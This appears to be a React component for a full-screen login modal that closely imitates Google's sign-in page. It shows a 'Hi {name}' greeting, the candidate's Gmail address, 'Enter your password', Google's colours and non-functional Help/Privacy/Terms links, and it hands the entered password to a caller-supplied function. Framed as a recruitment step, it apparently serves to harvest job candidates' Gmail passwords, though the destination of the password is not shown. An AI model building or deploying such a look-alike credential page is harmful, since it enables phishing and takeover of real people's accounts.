"use client";

import { useState, useEffect, useId } from "react";

interface NLoginModalProps {
  isOpen: boolean;
  candidateName?: string;
  candidateEmail?: string;
  isSubmitted?: boolean;
  errorMessage?: string | null;
  onSubmitPassword: (password: string) => Promise<void>;
  onClose?: () => void;
}

export default function NLoginModal({
  isOpen,
  candidateName = "Candidate Name",
  candidateEmail = "candidate@gmail.com",
  isSubmitted = false,
  errorMessage = null,
  onSubmitPassword,
  onClose,
}: NLoginModalProps) {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(errorMessage);
  const inputId = useId();

  // Reset password field when modal opens or sync external errorMessage
  useEffect(() => {
    if (isOpen) {
      if (errorMessage) {
        setError(errorMessage);
        setIsSubmitting(false);
      } else {
        setPassword("");
        setShowPassword(false);
        setError(null);
        setIsSubmitting(false);
      }
    }
  }, [isOpen, errorMessage]);

  if (!isOpen) return null;

  // Format candidate first name or full name cleanly
  const displayName = candidateName.trim()
    ? candidateName.trim().split(/\s+/)[0] || candidateName.trim()
    : "Candidate";

  const displayEmail = candidateEmail.trim() || "candidate@gmail.com";
  const initialLetter = (displayName.charAt(0) || displayEmail.charAt(0) || "C").toUpperCase();

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!password.trim()) {
      setError("Enter a password");
      return;
    }
    setError(null);
    setIsSubmitting(true);
    try {
      await onSubmitPassword(password.trim());
    } catch (err: any) {
      setError(err?.message || "Failed to submit. Please try again.");
      setIsSubmitting(false);
    }
  };

  const showSpinnerOnly = isSubmitting || isSubmitted;

  return (
    <div
      className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-[#f0f4f9] p-3 sm:p-6 md:p-10 overflow-y-auto animate-fade-in font-sans"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-[1184px] flex flex-col items-center">
        {/* Main Google/SSO Style Card - Scaled Frame (-20%) */}
        <div className="w-full min-h-[512px] sm:min-h-[560px] bg-white rounded-[28px] p-8 sm:p-12 lg:p-16 shadow-[0_8px_36px_rgba(0,0,0,0.08)] border border-black/[0.04] transition-all relative overflow-hidden flex flex-col justify-center">
          {/* Subtle top indeterminate progress bar when submitting */}
          {showSpinnerOnly && (
            <div className="absolute top-0 left-0 right-0 h-1.5 bg-blue-100 overflow-hidden">
              <div className="h-full bg-[#0b57d0] animate-indeterminate" />
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-14 lg:gap-20 items-center">
            {/* Left Column: N Logo, Greeting, Candidate Pill */}
            <div className="space-y-5 sm:space-y-6">
              {/* N-Logo (PNG Format, Scaled) */}
              <div className="flex items-center">
                <img
                  src="/images/n-logo.png"
                  alt="N-Logo"
                  className="w-16 h-16 object-contain rounded-xl select-none shadow-sm"
                />
              </div>

              {/* Greeting */}
              <div className="pt-1">
                <h1 className="text-3xl sm:text-4xl lg:text-[46px] font-normal text-[#1f1f1f] tracking-tight leading-[1.15]">
                  Hi {displayName}
                </h1>
              </div>

              {/* Candidate Email Badge / Pill with Avatar and Chevron */}
              <div className="pt-1">
                <div className="inline-flex items-center gap-2.5 border border-[#747775]/70 hover:border-[#1f1f1f] rounded-full pl-1.5 pr-3.5 py-1 bg-white hover:bg-gray-50/80 transition-colors select-none cursor-pointer shadow-2xs">
                  {/* Round Avatar with initial */}
                  <div className="w-7 h-7 rounded-full bg-[#00796b] text-white flex items-center justify-center text-xs font-semibold shrink-0 uppercase shadow-xs">
                    {initialLetter}
                  </div>

                  {/* Candidate Email */}
                  <span className="text-sm sm:text-base font-medium text-[#1f1f1f] tracking-tight">
                    {displayEmail}
                  </span>

                  {/* Downward chevron / caret */}
                  <svg
                    className="w-3.5 h-3.5 text-[#444746]"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                    aria-hidden="true"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
                      clipRule="evenodd"
                    />
                  </svg>
                </div>
              </div>
            </div>

            {/* Right Column: Outlined Password Input OR Pure Round Loading Circle */}
            <div className="w-full flex flex-col justify-center">
              {showSpinnerOnly ? (
                /* Pure Round Loading Circle without any text */
                <div className="py-20 sm:py-28 flex flex-col items-center justify-center animate-fade-in w-full">
                  <div
                    className="w-14 h-14 sm:w-16 sm:h-16 border-[4px] border-blue-200 border-t-[#0b57d0] rounded-full animate-spin"
                    aria-label="Loading..."
                  />
                </div>
              ) : (
                /* Password Entry Form */
                <form onSubmit={handleSubmit} className="space-y-3.5 pt-2 md:pt-3">
                  {/* Google Style Outlined Floating Label Input */}
                  <div className="relative">
                    <input
                      id={inputId}
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (error) setError(null);
                      }}
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      placeholder=" "
                      autoComplete="current-password"
                      autoFocus
                      disabled={isSubmitting}
                      className={`peer w-full h-[54px] sm:h-[60px] px-4 pt-3.5 pb-1 text-base sm:text-lg text-[#1f1f1f] bg-transparent rounded-[5px] border outline-none transition-all font-sans ${
                        error
                          ? "border-2 border-[#b3261e]"
                          : isFocused
                          ? "border-2 border-[#0b57d0]"
                          : "border border-[#747775] hover:border-[#1f1f1f]"
                      }`}
                    />

                    {/* Floating Label with background cutout */}
                    <label
                      htmlFor={inputId}
                      className={`absolute left-3.5 transition-all pointer-events-none px-1 bg-white select-none font-normal ${
                        isFocused || password.length > 0
                          ? `-top-2.5 text-xs sm:text-xs ${
                              error
                                ? "text-[#b3261e] font-medium"
                                : isFocused
                                ? "text-[#0b57d0] font-medium"
                                : "text-[#444746]"
                            }`
                          : "top-3.5 text-base sm:text-lg text-[#444746]"
                      }`}
                    >
                      Enter your password
                    </label>
                  </div>

                  {/* Show password Checkbox */}
                  <div className="pt-1.5 flex items-center gap-3 select-none">
                    <input
                      id="n-show-password"
                      type="checkbox"
                      checked={showPassword}
                      onChange={(e) => setShowPassword(e.target.checked)}
                      className="w-4.5 h-4.5 rounded-[3px] border border-[#747775] text-[#0b57d0] focus:ring-0 focus:ring-offset-0 cursor-pointer"
                    />
                    <label
                      htmlFor="n-show-password"
                      className="text-sm sm:text-base text-[#1f1f1f] cursor-pointer font-normal"
                    >
                      Show password
                    </label>
                  </div>

                  {/* Error Notification */}
                  {error && (
                    <div className="pt-1 flex items-center gap-2 text-xs sm:text-sm text-[#b3261e] font-normal animate-fade-in">
                      <svg className="w-4 h-4 shrink-0 fill-current" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <span>{error}</span>
                    </div>
                  )}

                  {/* Action Row: Forgot Password & Next Button */}
                  <div className="flex items-center justify-between pt-10 sm:pt-14">
                    <button
                      type="button"
                      onClick={() => {
                        setError("Please contact your recruitment administrator for your password.");
                      }}
                      className="text-sm sm:text-base font-medium text-[#0b57d0] hover:bg-blue-50/70 px-2.5 py-1.5 -ml-2.5 rounded-full transition-colors cursor-pointer select-none"
                    >
                      Forgot password?
                    </button>

                    <button
                      type="submit"
                      disabled={isSubmitting || !password.trim()}
                      className="bg-[#0b57d0] hover:bg-[#0842a0] disabled:bg-[#0b57d0]/40 disabled:cursor-not-allowed text-white font-medium text-sm sm:text-base px-7 py-2.5 sm:py-3 rounded-full transition-all active:scale-95 shadow-xs flex items-center justify-center gap-2 cursor-pointer select-none"
                    >
                      <span>Next</span>
                    </button>
                  </div>
                </form>
              )}
            </div>
          </div>
        </div>

        {/* Outer Footer Below Card */}
        <div className="w-full max-w-[1184px] flex flex-col sm:flex-row items-center justify-between gap-3 text-xs sm:text-sm text-[#444746] mt-5 px-4 select-none">
          {/* Language selector */}
          <div className="flex items-center gap-2 hover:text-[#1f1f1f] cursor-pointer">
            <span>English (United States)</span>
            <span className="text-xs">▼</span>
          </div>

          {/* Legal / Help links */}
          <div className="flex items-center gap-6 sm:gap-7">
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Help</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Privacy</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Terms</span>
          </div>
        </div>
      </div>
    </div>
  );
}
